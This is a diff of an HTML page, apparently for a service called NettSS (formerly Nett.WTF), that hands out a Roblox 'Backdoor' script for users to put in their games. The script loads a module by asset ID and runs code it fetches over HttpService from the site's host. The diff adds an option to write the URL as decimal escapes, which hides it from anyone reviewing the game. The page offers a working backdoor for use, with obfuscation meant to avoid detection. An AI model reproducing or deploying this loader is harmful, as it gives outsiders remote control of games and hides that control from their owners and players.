@@ -3,7 +3,7 @@
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>nett.wtf</title>
+        <title>NettSS</title>
         <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
         <link rel="stylesheet" href="/assets/css/index.css">
         <link rel="stylesheet" media="screen" href="/assets/css/sidebar.css">
@@ -14,14 +14,23 @@
     </head>
     <body>
         <div style="text-align: center;">
-            <h1 onclick="window.location.href = '/'"><div class="logo_name"><span style="color: #bc49db;">Nett</span><span>.WTF</span></div></h1>
+            <h1 onclick="window.location.href = '/'"><div class="logo_name"><span style="color: #bc49db;">Nett</span><span>SS</span></div></h1>
             <h2 style="margin-bottom: 0;">Backdoor</h2>
             <p>Put this script in your game. Make sure HTTPEnabled is true.</p>
         </div>
         <pre id="editor"></pre>
         <script src="/assets/js/editor.js"></script>
         <script>
-            SetText("a=0x26E001F12;require(a)(game:GetService(\"HttpService\"):GetAsync(\"\\" + ("https://nett.wtf/backdoor.lua").split("").map(c => c.charCodeAt(0).toString(10).padStart(3, "0")).join("\\").toUpperCase() + "\",true))")
+            const url = `https://${document.location.hostname}/admin.luau`//
+            SetText(
+                `
+a=0x26E001F12;require(a)(game:GetService("HttpService"):GetAsync("${url}",true))
+
+--[[
+    alternatively, use
+     "\\${url.split("").map(c => c.charCodeAt(0).toString(10).padStart(3, "0")).join("\\").toUpperCase()}"
+    as a url instead of "${url}"
+]]`)
             editor.setReadOnly(true);
         </script>
     </body>
